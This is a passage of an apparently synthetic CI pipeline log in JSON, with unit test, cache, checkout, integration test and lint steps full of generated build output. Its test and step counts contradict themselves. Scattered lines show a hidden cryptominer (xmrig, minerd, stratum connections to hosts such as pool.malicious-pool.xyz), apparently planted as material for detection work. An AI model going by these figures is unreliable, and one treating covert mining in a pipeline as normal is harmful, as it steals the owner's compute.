          "Artifact uploaded: dist.zip (3MB)",
          "Cache restored successfully (44MB)",
          "  PASS: unit/test_api_health.spec.js",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "npm install: resolved 527 packages",
          "Building Docker image...",
          "[12:47:59] INFO: Starting build process",
          "Coverage: 73% statements, 97% branches",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Task completed in 3094ms",
          "\u2713 Step 'setup' succeeded",
          "Already up to date.",
          "npm install: added 343 packages",
          "Coverage: 90% statements, 67% branches",
          "WARNING: axios has known vulnerabilities",
          "Step 4/16: Running migrations",
          "npm install: added 14 packages",
          "HEAD is now at 58c0cb6",
          "Fetching submodules...",
          "[12:47:59] DEBUG: Connection pool: 11 active",
          "Test Suites: 44 passed, 38 total",
          "Layer 9/12: RUN command",
          "Accepted share #793",
          "Success!",
          "Using Node.js 17.2.8",
          "Waiting...",
          "[12:47:59] DEBUG: Connection pool: 10 active",
          "Cache invalidated: dependencies",
          "Pushing to registry...",
          "Time: 9.526s",
          "minerd: 9 threads active",
          "Switched to branch 'bugfix/task-181'",
          "Step 5/16: Testing",
          "Checking out main branch",
          "Step 11/15: Building",
          "\u2713 Task completed in 2947ms",
          "Test Suites: 13 passed, 29 total",
          "\u2717 build failed with exit code 113",
          "Artifact uploaded: dist.zip (42MB)",
          "Time: 120.835s",
          "npm notice: created a lockfile",
          "\u2713 All checks passed",
          "Snapshots: 23 passed, 17 total",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Environment: development",
          "  PASS: test_db_connect (475ms)",
          "Pulling image: python:latest",
          "Time: 58.573s",
          "Pulling image: node:3.11",
          "POST /api - 201 (439ms)",
          "OK",
          "Step 17/21: Linting",
          "Pushing to registry...",
          "Success!",
          "\u2713 All checks passed",
          "Bundling runtime.css",
          "yarn add: Done in 9.35s",
          "POST /api - 201 (45ms)",
          "Minifying main.js",
          "Cache miss for key-3888",
          "\u2713 All checks passed",
          "npm install: added 386 packages",
          "Loading...",
          "Cache restored successfully (272MB)",
          "[12:47:59] DEBUG: Query executed in 89ms",
          "[12:47:59] WARN: Deprecated API usage",
          "[12:47:59] INFO: Request completed",
          "npm install: added 136 packages",
          "\u2713 Step 'setup' succeeded",
          "Compiling lib/main.py...",
          "Accepted share #340",
          "[12:47:59] DEBUG: Connection pool: 20 active",
          "Compiling utils/service.java...",
          "Already up to date.",
          "TLS handshake completed",
          "Cache saved successfully",
          "Step 7/21: Deploying",
          "Exception: ValueError",
          "npm install: added 54 packages",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "minerd: 16 threads active",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_db_connect",
          "Artifact uploaded: dist.zip (54MB)",
          "Building Docker image...",
          "pip: Collecting prettier",
          "Compiling lib/index.js...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-13T12:49:48.805850",
        "finished_at": "2025-12-13T12:50:08.184948",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling components/main.py...",
          "Generating source maps...",
          "Compiling src/service.java...",
          "Layer 6/12: ENV command",
          "[12:47:59] DEBUG: Memory usage: 1884MB",
          "Exception: TypeError",
          "[12:47:59] DEBUG: Query executed in 98ms",
          "npm notice: created a lockfile",
          "Done.",
          "Already up to date.",
          "Compiling components/handler.rs...",
          "Exception: ValueError",
          "Processing...",
          "Step 1/16: Installing dependencies",
          "[12:47:59] DEBUG: Query executed in 30ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Success!",
          "\u2713 All checks passed",
          "Compiling utils/main.py...",
          "Layer 10/15: COPY command",
          "Image pulled successfully",
          "Pushing to registry...",
          "Platform: linux-x64",
          "  PASS: unit/test_cache_hit.spec.js",
          "Platform: darwin-arm64",
          "Step 3/21: Deploying",
          "Cache miss for key-7934",
          "OK",
          "Environment: test",
          "Image pulled successfully",
          "Snapshots: 10 passed, 6 total",
          "Artifact downloaded: 1MB",
          "Layer 10/15: ENV command",
          "[12:47:59] DEBUG: Loading configuration",
          "Compiling src/handler.rs...",
          "OK",
          "npm install: added 90 packages",
          "pip: Collecting eslint",
          "Checking out develop branch",
          "\u2713 validate completed",
          "Generating source maps...",
          "  PASS: test_cache_hit (135ms)",
          "\u2713 Step 'checkout' succeeded",
          "Finished.",
          "Ready.",
          "[12:47:59] DEBUG: Loading configuration",
          "[12:47:59] DEBUG: Query executed in 45ms",
          "Step 8/24: Building",
          "Pushing to registry...",
          "Tests: 292 passed, 97 total",
          "Checking out main branch",
          "\u2713 Step 'checkout' succeeded",
          "[12:47:59] INFO: Starting build process",
          "  PASS: test_db_connect (218ms)",
          "\u2713 Step 'checkout' succeeded",
          "Ready.",
          "Pulling image: node:18",
          "Bundling runtime.js",
          "Step 13/24: Running migrations",
          "[12:47:59] DEBUG: Memory usage: 1034MB",
          "[12:47:59] INFO: Processing request",
          "Compiling utils/utils.go...",
          "Optimizing 59 modules...",
          "WARNING: express has known vulnerabilities",
          "Cache restored successfully (382MB)",
          "Step 8/17: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "Optimizing 96 modules...",
          "[12:47:59] DEBUG: Query executed in 58ms",
          "[12:47:59] ERROR: Connection failed",
          "Compiling components/index.js...",
          "Step 1/19: Linting",
          "yarn add: Done in 2.75s",
          "NODE_ENV=production",
          "[12:47:59] DEBUG: Initializing service",
          "  PASS: test_db_connect (285ms)",
          "[12:47:59] DEBUG: Initializing service",
          "GET /api - 201 (56ms)",
          "Using Python 3.9",
          "Artifact downloaded: 9MB",
          "HEAD is now at 9f94300",
          "Fetching submodules...",
          "[12:47:59] ERROR: Connection failed",
          "Test Suites: 35 passed, 25 total",
          "Image pulled successfully",
          "Pulling image: node:18",
          "Exception: ValueError",
          "HEAD is now at 4d80d9a",
          "Connection established",
          "OK",
          "npm notice: package.json updated",
          "Cache restored successfully (465MB)",
          "Step 17/19: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "Platform: darwin-arm64",
          "Verifying...",
          "Compiling utils/utils.go...",
          "\u2717 build failed with exit code 113",
          "Step 15/17: Deploying",
          "Artifact uploaded: build.tar.gz (15MB)",
          "npm install: resolved 1036 packages",
          "Cache saved successfully",
          "npm install: added 472 packages",
          "\u2713 Task completed in 1918ms",
          "Completed.",
          "\u2717 build failed with exit code 91",
          "Verifying...",
          "pip: Installing build dependencies...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Generating source maps...",
          "[12:47:59] INFO: Connecting to database",
          "Done.",
          "pip: Collecting jest",
          "NODE_ENV=test",
          "[12:47:59] WARN: Deprecated API usage",
          "[12:47:59] DEBUG: Connection pool: 20 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "pip install: Successfully installed eslint-4.1",
          "TLS handshake completed",
          "Creating production build...",
          "Image pulled successfully",
          "Step 20/18: Deploying",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "[12:47:59] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (73MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "Using Python 3.9",
          "POST /upload - 202 (66ms)",
          "\u2717 build failed with exit code 34",
          "Time: 93.329s",
          "Done.",
          "Cache hit for key-6156",
          "yarn add: Done in 25.77s",
          "pip: Downloading eslint-2.0.tar.gz",
          "Using Node.js 16.19.9",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Environment: production",
          "[12:47:59] DEBUG: Loading configuration",
          "Creating production build...",
          "[12:47:59] INFO: Processing request",
          "Generating source maps...",
          "Transforming 857 files...",
          "Cache hit for key-5290",
          "Ran 30 tests in 44s",
          "Ready.",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:47:59] DEBUG: Memory usage: 1754MB",
          "Transforming 561 files...",
          "Minifying app.js",
          "Step 20/20: Linting",
          "Ran 77 tests in 35s",
          "\u2713 Step 'setup' succeeded",
          "[12:47:59] DEBUG: Query executed in 88ms",
          "[12:47:59] WARN: Deprecated API usage",
          "Finished.",
          "Step 8/24: Testing",
          "Compiling utils/app.ts...",
          "TLS handshake completed",
          "Artifact downloaded: 12MB",
          "[12:47:59] INFO: Connecting to database",
          "[12:47:59] INFO: Request completed",
          "Compiling components/index.js...",
          "Step 17/20: Linting",
          "pip: Downloading express-5.19.tar.gz",
          "Cache hit for key-2756",
          "Switched to branch 'bugfix/task-384'",
          "[12:47:59] INFO: Request completed",
          "Cache miss for key-1747",
          "Loading...",
          "Test Suites: 14 passed, 14 total",
          "pip: Installing build dependencies...",
          "Done.",
          "[12:47:59] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Installing prettier@2.14.9",
          "[12:47:59] INFO: Connecting to database",
          "Bundling vendor.css",
          "pip: Collecting jest",
          "WARNING: axios has known vulnerabilities",
          "Platform: linux-x64",
          "Verifying...",
          "Minifying app.js",
          "Optimizing 95 modules...",
          "\u2713 deploy completed",
          "Processing...",
          "[12:47:59] INFO: Processing request",
          "Coverage: 92% statements, 81% branches",
          "Fetching from https://githubusercontent.com/package.json",
          "Time: 65.269s",
          "Artifact downloaded: 39MB",
          "Exception: ValueError",
          "Compiling utils/service.java...",
          "Step 5/24: Testing",
          "Transforming 221 files...",
          "Waiting...",
          "Compiling utils/service.java...",
          "Platform: linux-x64",
          "WARNING: jest has known vulnerabilities",
          "Checking out master branch",
          "yarn add: Done in 3.55s",
          "Connection established",
          "Done.",
          "NODE_ENV=test",
          "[12:47:59] DEBUG: Connection pool: 7 active",
          "Checking out main branch",
          "[12:47:59] DEBUG: Memory usage: 1463MB",
          "[12:47:59] INFO: Processing request",
          "Environment: staging",
          "FAILED: test_api_health",
          "Image pulled successfully",
          "Compiling src/app.ts...",
          "\u2713 validate completed",
          "HEAD is now at 35ccc9a",
          "Verifying...",
          "[12:47:59] DEBUG: Memory usage: 1799MB",
          "Using Node.js 15.3.5",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "[12:47:59] DEBUG: Memory usage: 1946MB",
          "Fetching submodules...",
          "npm install: resolved 1831 packages",
          "Building Docker image...",
          "\u2713 Task completed in 2368ms",
          "Completed.",
          "npm notice: created a lockfile",
          "Tests: 230 passed, 57 total",
          "Using Node.js 20.4.4",
          "yarn add: Done in 30.33s",
          "[12:47:59] DEBUG: Connection pool: 7 active",
          "Artifact downloaded: 8MB",
          "Compiling components/handler.rs...",
          "pip: Downloading express-3.4.tar.gz",
          "Platform: win32-x64",
          "Artifact downloaded: 45MB",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-13T12:50:08.184948",
        "finished_at": "2025-12-13T12:50:21.104346",
        "log_lines": [
          "=== Step: checkout ===",
          "Creating production build...",
          "Minifying app.js",
          "Step 8/23: Testing",
          "Step 10/24: Deploying",
          "[12:47:59] DEBUG: Connection pool: 18 active",
          "Test Suites: 15 passed, 37 total",
          "Checking out main branch",
          "Step 10/15: Linting",
          "Ran 136 tests in 39s",
          "Compiling lib/main.py...",
          "[12:47:59] WARN: Deprecated API usage",
          "Cache hit for key-6353",
          "Waiting...",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "\u2713 Step 'install' succeeded",
          "  PASS: integration/test_auth_login.spec.js",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "NODE_ENV=test",
          "[12:47:59] DEBUG: Query executed in 75ms",
          "Image pulled successfully",
          "Environment: production",
          "FAILED: test_db_connect",
          "Ready.",
          "Cache restored successfully (278MB)",
          "Image pulled successfully",
          "Success!",
          "Cache invalidated: node_modules",
          "[12:47:59] DEBUG: Initializing service",
          "Installing express@1.7.2",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.10",
          "pip: Installing build dependencies...",
          "Compiling lib/app.ts...",
          "Optimizing 27 modules...",
          "Finished.",
          "GET /health - 200 (6ms)",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:59] INFO: Starting build process",
          "Cache miss for key-6228",
          "Uploading artifact 'coverage' (6 files)",
          "Installing express@4.7.9",
          "Switched to branch 'hotfix/task-789'",
          "Transforming 509 files...",
          "Step 5/24: Deploying",
          "[12:47:59] DEBUG: Memory usage: 1394MB",
          "\u2713 deploy completed",
          "  PASS: integration/test_auth_login.spec.js",
          "WARNING: lodash has known vulnerabilities",
          "Compiling lib/main.py...",
          "  PASS: test_db_connect (306ms)",
          "pip: Downloading express-2.17.tar.gz",
          "yarn add: Done in 22.72s",
          "\u2713 All checks passed",
          "Cache miss for key-3061",
          "Ran 61 tests in 29s",
          "[12:47:59] INFO: Connecting to database",
          "\u2717 build failed with exit code 13",
          "Pulling image: node:3.11",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Optimizing 97 modules...",
          "Tests: 308 passed, 77 total",
          "[12:47:59] INFO: Processing request",
          "\u2713 Task completed in 386ms",
          "Success!",
          "Building Docker image...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 24",
          "GET /status - 201 (100ms)",
          "FAILED: test_user_create",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Uploading artifact 'coverage' (14 files)",
          "Snapshots: 25 passed, 11 total",
          "OK",
          "Step 8/22: Running migrations",
          "Step 4/17: Linting",
          "Step 2/20: Linting",
          "Creating production build...",
          "HEAD is now at 3bb467d",
          "POST /data - 202 (36ms)",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "POST /data - 202 (438ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Processing...",
          "npm notice: package.json updated",
          "Generating source maps...",
          "Time: 85.869s",
          "[12:47:59] INFO: Starting build process",
          "Compiling components/service.java...",
          "\u2713 deploy completed",
          "[12:47:59] WARN: Deprecated API usage",
          "Fetching from https://github.com/package.json",
          "Building Docker image...",
          "Finished.",
          "Environment: development",
          "Layer 2/10: RUN command",
          "[12:47:59] INFO: Request completed",
          "Environment: production",
          "GET /api - 204 (67ms)",
          "Pushing to registry...",
          "Completed.",
          "[12:47:59] DEBUG: Query executed in 73ms",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Already up to date.",
          "Finished.",
          "[12:47:59] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Coverage: 75% statements, 70% branches",
          "Already up to date.",
          "Step 1/15: Installing dependencies",
          "Artifact uploaded: dist.zip (94MB)",
          "[12:47:59] DEBUG: Query executed in 9ms",
          "Step 12/15: Running migrations",
          "[12:47:59] INFO: Cache refreshed",
          "Cache miss for key-9511",
          "POST /api - 202 (496ms)",
          "Waiting...",
          "[12:47:59] INFO: Cache refreshed",
          "[12:47:59] WARN: Deprecated API usage",
          "Cache restored successfully (494MB)",
          "Compiling lib/index.js...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "pip: Downloading lodash-4.7.tar.gz",
          "Test Suites: 49 passed, 6 total",
          "Pushing to registry...",
          "Connection established",
          "Using Node.js 16.3.10",
          "OK",
          "Cache invalidated: dependencies",
          "Creating production build...",
          "\u2713 All checks passed",
          "Pulling image: python:3.11",
          "[12:47:59] DEBUG: Query executed in 55ms",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Creating production build...",
          "npm notice: package.json updated",
          "\u2713 Step 'build' succeeded",
          "Cache miss for key-6647",
          "Environment: production",
          "Transforming 765 files...",
          "Step 19/19: Testing",
          "Loading...",
          "Already up to date.",
          "pip: Collecting lodash",
          "[12:47:59] WARN: Deprecated API usage",
          "OK",
          "Done.",
          "Exception: RuntimeError",
          "HEAD is now at 7df64d7",
          "Ran 25 tests in 17s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out master branch",
          "pip: Installing build dependencies...",
          "Test Suites: 47 passed, 20 total",
          "TLS handshake completed",
          "pip: Collecting axios",
          "FAILED: test_auth_login",
          "Compiling lib/main.py...",
          "\u2713 Step 'setup' succeeded",
          "Pulling image: python:3.11",
          "Step 16/16: Deploying",
          "Fetching submodules...",
          "Image pulled successfully",
          "Coverage: 99% statements, 78% branches",
          "Generating source maps...",
          "NODE_ENV=production",
          "Generating source maps...",
          "Layer 6/13: RUN command",
          "Fetching from https://npmjs.org/package.json",
          "Ran 25 tests in 24s",
          "[12:47:59] WARN: Deprecated API usage",
          "Generating source maps...",
          "Environment: production",
          "Exception: ValueError",
          "Loading...",
          "Compiling src/service.java...",
          "Layer 7/10: COPY command",
          "Finished.",
          "Cache miss for key-9845",
          "Done.",
          "Platform: win32-x64",
          "[12:47:59] INFO: Cache refreshed",
          "Loading...",
          "npm install: resolved 1029 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "[12:47:59] DEBUG: Memory usage: 1494MB",
          "POST /data - 200 (276ms)",
          "[12:47:59] DEBUG: Loading configuration",
          "Layer 8/15: RUN command",
          "Minifying main.js",
          "Cache invalidated: build",
          "Step 8/23: Deploying",
          "Step 13/20: Installing dependencies",
          "Step 2/22: Building",
          "Coverage: 84% statements, 77% branches",
          "Step 6/22: Building",
          "\u2717 build failed with exit code 85",
          "\u2713 Task completed in 2160ms",
          "Cache miss for key-5926",
          "Step 13/19: Testing",
          "[12:47:59] DEBUG: Query executed in 57ms",
          "Transforming 682 files...",
          "[12:47:59] INFO: Processing request",
          "Connection established",
          "Test Suites: 21 passed, 21 total",
          "Step 11/20: Installing dependencies",
          "GET /api - 200 (86ms)",
          "Cache miss for key-5754",
          "npm install: added 394 packages",
          "[12:47:59] ERROR: Connection failed",
          "npm install: resolved 1988 packages",
          "Snapshots: 32 passed, 27 total",
          "Pulling image: alpine:latest",
          "HEAD is now at f274201",
          "Step 3/25: Building",
          "[12:47:59] DEBUG: Connection pool: 4 active",
          "Tests: 326 passed, 287 total",
          "Compiling utils/index.js...",
          "Layer 7/8: COPY command",
          "[12:47:59] INFO: Cache refreshed",
          "Step 19/25: Testing",
          "[12:47:59] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Generating source maps...",
          "pip install: Successfully installed jest-4.18",
          "Loading...",
          "pip: Installing build dependencies...",
          "Loading...",
          "WARNING: axios has known vulnerabilities",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-13T12:50:21.104346",
        "finished_at": "2025-12-13T12:51:25.701338",
        "log_lines": [
          "=== Step: integration_tests ===",
          "pip: Downloading axios-3.6.tar.gz",
          "Environment: test",
          "cryptonight: Hashrate: 7549 H/s",
          "[12:47:59] INFO: Cache refreshed",
          "\u2713 Task completed in 1911ms",
          "[12:47:59] INFO: Processing request",
          "\u2713 package completed",
          "\u2717 build failed with exit code 44",
          "pip: Downloading jest-3.17.tar.gz",
          "[12:47:59] INFO: Cache refreshed",
          "Compiling src/main.py...",
          "Installing eslint@4.18.2",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:59] DEBUG: Connection pool: 12 active",
          "Cache miss for key-3986",
          "FAILED: test_api_health",
          "Optimizing 12 modules...",
          "[12:47:59] INFO: Connecting to database",
          "Coverage: 94% statements, 63% branches",
          "Verifying...",
          "Time: 30.735s",
          "Step 12/23: Building",
          "pip: Collecting webpack",
          "Compiling src/app.ts...",
          "Using Node.js 18.9.7",
          "TLS handshake completed",
          "Creating production build...",
          "Transforming 321 files...",
          "Generating source maps...",
          "Coverage: 78% statements, 64% branches",
          "Fetching submodules...",
          "Transforming 346 files...",
          "npm notice: package.json updated",
          "xmrig: Starting mining on pool.malicious-pool.xyz:3333",
          "Cache miss for key-9105",
          "pip: Downloading express-5.20.tar.gz",
          "minerd: 9 threads active",
          "[12:47:59] INFO: Connecting to database",
          "Test Suites: 20 passed, 18 total",
          "Using Python 3.11",
          "[12:47:59] INFO: Processing request",
          "Verifying...",
          "  PASS: test_db_connect (61ms)",
          "Finished.",
          "[12:47:59] DEBUG: Connection pool: 10 active",
          "npm notice: created a lockfile",
          "WARNING: jest has known vulnerabilities",
          "Verifying...",
          "[12:47:59] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (16MB)",
          "Time: 51.686s",
          "Loading...",
          "yarn add: Done in 19.79s",
          "Loading...",
          "[12:47:59] INFO: Cache refreshed",
          "Using Node.js 15.5.4",
          "Exception: NullPointerException",
          "Generating source maps...",
          "Exception: TypeError",
          "GET /status - 200 (63ms)",
          "\u2717 build failed with exit code 53",
          "Bundling styles.js",
          "cryptonight: Hashrate: 890 H/s",
          "[12:47:59] INFO: Cache refreshed",
          "Cache saved successfully",
          "Artifact downloaded: 29MB",
          "Cache invalidated: dependencies",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "minerd: 5 threads active",
          "Test Suites: 37 passed, 14 total",
          "Installing react@3.0.5",
          "\u2713 Step 'test' succeeded",
          "pip install: Successfully installed jest-1.10",
          "[12:47:59] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Optimizing 70 modules...",
          "Artifact uploaded: dist.zip (91MB)",
          "Uploading artifact 'coverage' (4 files)",
          "[12:47:59] INFO: Request completed",
          "Image pulled successfully",
          "pip: Downloading jest-2.14.tar.gz",
          "Step 7/24: Installing dependencies",
          "Fetching from https://github.com/package.json",
          "Tests: 311 passed, 70 total",
          "Layer 5/9: RUN command",
          "Using Python 3.10",
          "Verifying...",
          "Using Python 3.12",
          "Finished.",
          "Environment: staging",
          "pip install: Successfully installed prettier-4.12",
          "Creating production build...",
          "Step 1/24: Installing dependencies",
          "xmrig: Starting mining on pool.evil-server.cc:3333",
          "pip: Installing build dependencies...",
          "Tests: 392 passed, 450 total",
          "Using Python 3.9",
          "Transforming 766 files...",
          "Artifact uploaded: dist.zip (71MB)",
          "Installing webpack@2.7.1",
          "Fetching from https://npmjs.org/package.json",
          "WARNING: axios has known vulnerabilities",
          "Minifying vendor.js",
          "Snapshots: 22 passed, 26 total",
          "Connection established",
          "  PASS: test_api_health (358ms)",
          "Snapshots: 40 passed, 11 total",
          "Cache saved successfully",
          "Snapshots: 8 passed, 32 total",
          "Bundling main.css",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Layer 5/10: ENV command",
          "Time: 11.720s",
          "[12:47:59] DEBUG: Memory usage: 1647MB",
          "Creating production build...",
          "Compiling utils/utils.go...",
          "Minifying vendor.js",
          "  PASS: unit/test_auth_login.spec.js",
          "Environment: test",
          "Completed.",
          "Step 1/25: Testing",
          "Test Suites: 41 passed, 48 total",
          "pip: Collecting prettier",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 12/23: Linting",
          "[12:47:59] INFO: Processing request",
          "\u2717 build failed with exit code 115",
          "Compiling utils/service.java...",
          "NODE_ENV=production",
          "Cache saved successfully",
          "FAILED: test_user_create",
          "[12:47:59] DEBUG: Connection pool: 12 active",
          "Environment: production",
          "[12:47:59] INFO: Request completed",
          "Already up to date.",
          "POST /api - 200 (110ms)",
          "Step 15/17: Building",
          "Connection established",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Image pulled successfully",
          "Cache restored successfully (263MB)",
          "Connection established",
          "Compiling components/handler.rs...",
          "Layer 7/12: ENV command",
          "Artifact uploaded: build.tar.gz (20MB)",
          "HEAD is now at 10500c5",
          "yarn add: Done in 11.49s",
          "Bundling styles.js",
          "Waiting...",
          "\u2713 All checks passed",
          "pip: Collecting webpack",
          "[12:47:59] WARN: Deprecated API usage",
          "Waiting...",
          "Step 17/24: Deploying",
          "Optimizing 76 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "Step 3/21: Testing",
          "Building Docker image...",
          "Step 13/24: Running migrations",
          "Generating source maps...",
          "Tests: 238 passed, 266 total",
          "Minifying vendor.js",
          "Pushing to registry...",
          "Finished.",
          "Tests: 268 passed, 481 total",
          "Coverage: 90% statements, 68% branches",
          "Coverage: 81% statements, 98% branches",
          "[12:47:59] INFO: Connecting to database",
          "npm install: added 33 packages",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Waiting...",
          "HEAD is now at 50e0ef9",
          "Image pulled successfully",
          "[12:47:59] DEBUG: Connection pool: 1 active",
          "Waiting...",
          "Fetching from https://npmjs.org/package.json",
          "[12:47:59] ERROR: Connection failed",
          "[12:47:59] WARN: Deprecated API usage",
          "Generating source maps...",
          "Success!",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:59] INFO: Cache refreshed",
          "Step 9/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Finished.",
          "Step 15/23: Running migrations",
          "Cache restored successfully (186MB)",
          "HEAD is now at 642fd9e",
          "Pushing to registry...",
          "OK",
          "Already up to date.",
          "Done.",
          "Pulling image: python:3.11",
          "Exception: TypeError",
          "Test Suites: 45 passed, 25 total",
          "[12:47:59] INFO: Request completed",
          "Fetching from https://googleapis.com/package.json",
          "Artifact downloaded: 21MB",
          "Waiting...",
          "HEAD is now at f24d583",
          "Pushing to registry...",
          "Image pulled successfully",
          "Step 16/23: Building",
          "Processing...",
          "Loading...",
          "pip: Collecting react",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: created a lockfile",
          "Connecting to stratum+tcp://mine.evil-server.cc:3333",
          "  PASS: test_user_create (298ms)",
          "[12:47:59] DEBUG: Query executed in 94ms",
          "Pulling image: node:18",
          "Minifying main.js",
          "npm notice: created a lockfile",
          "[12:47:59] DEBUG: Loading configuration",
          "POST /api - 201 (472ms)",
          "[12:47:59] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "[12:47:59] DEBUG: Connection pool: 8 active",
          "Generating source maps...",
          "\u2713 build completed",
          "yarn add: Done in 8.74s",
          "pip: Downloading lodash-5.18.tar.gz",
          "[12:47:59] DEBUG: Memory usage: 1057MB",
          "Loading...",
          "HEAD is now at 0ac115e",
          "Compiling src/index.js...",
          "POST /data - 200 (31ms)",
          "[12:47:59] DEBUG: Connection pool: 13 active",
          "Using Node.js 18.12.1",
          "Step 13/24: Testing",
          "HEAD is now at 2220b12",
          "Fetching submodules...",
          "Cache hit for key-6497",
          "Installing express@1.1.7",
          "Compiling utils/main.py...",
          "  PASS: test_api_health (126ms)",
          "Cache hit for key-3446",
          "GET /health - 201 (2ms)",
          "Switched to branch 'feature/task-426'",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-13T12:51:25.701338",
        "finished_at": "2025-12-13T12:51:57.999834",
        "log_lines": [
          "=== Step: lint ===",
          "Layer 10/13: RUN command",
          "Minifying vendor.js",
          "Processing...",
          "pip: Collecting axios",
          "Cache saved successfully",
          "OK",
          "Connection established",
          "Verifying...",
          "Waiting...",
          "WARNING: jest has known vulnerabilities",
          "FAILED: test_user_create",
          "\u2717 build failed with exit code 67",
          "npm install: resolved 740 packages",
          "TLS handshake completed",
          "Step 20/18: Running migrations",
          "Completed.",
          "npm notice: package.json updated",
          "Step 10/21: Running migrations",
          "Step 12/24: Installing dependencies",
          "GET /status - 201 (50ms)",
          "NODE_ENV=development",
          "Fetching submodules...",
          "Step 16/20: Running migrations",
          "Step 16/18: Building",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Cache miss for key-3340",
          "Pulling image: node:18",
          "Loading...",
          "Compiling lib/utils.go...",
          "Artifact downloaded: 40MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out main branch",
          "npm notice: created a lockfile",
          "[12:47:59] ERROR: Connection failed",
          "Building Docker image...",
          "Compiling utils/service.java...",
          "Verifying...",
          "pip install: Successfully installed react-3.11",
          "Compiling src/main.py...",
          "\u2713 Step 'checkout' succeeded",
          "npm install: resolved 357 packages",
          "Test Suites: 8 passed, 25 total",
          "Done.",
          "[12:47:59] DEBUG: Memory usage: 1005MB",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Layer 3/14: RUN command",
          "Step 16/23: Testing",
          "[12:47:59] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (73MB)",
          "\u2713 Step 'test' succeeded",
          "Step 2/16: Running migrations",
          "Success!",
          "Verifying...",
          "Done.",
          "Building Docker image...",
          "Processing...",
          "[12:47:59] ERROR: Connection failed",
          "Minifying app.js",
          "Creating production build...",
          "[12:47:59] DEBUG: Query executed in 23ms",
          "Layer 1/15: RUN command",
          "Transforming 939 files...",
          "[12:47:59] INFO: Cache refreshed",
          "Test Suites: 12 passed, 44 total",
          "Compiling src/main.py...",
          "Creating production build...",
          "[12:47:59] INFO: Request completed",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting eslint",
          "Minifying main.js",
          "Already up to date.",
          "Using Node.js 20.16.5",
          "[12:47:59] INFO: Request completed",
          "NODE_ENV=test",
          "Verifying...",
          "npm notice: created a lockfile",
          "Checking out master branch",
          "Checking out main branch",
          "Creating production build...",
          "[12:47:59] DEBUG: Connection pool: 19 active",
          "Checking out develop branch",
          "[12:47:59] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "Finished.",
          "TLS handshake completed",
          "Completed.",
          "OK",
          "[12:47:59] INFO: Request completed",
          "Cache restored successfully (176MB)",
          "\u2713 Task completed in 3558ms",
          "  PASS: unit/test_api_health.spec.js",
          "  PASS: test_cache_hit (353ms)",
          "Environment: staging",
          "yarn add: Done in 1.63s",
          "Cache miss for key-9526",
          "\u2713 Task completed in 2083ms",
          "Layer 10/9: ENV command",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
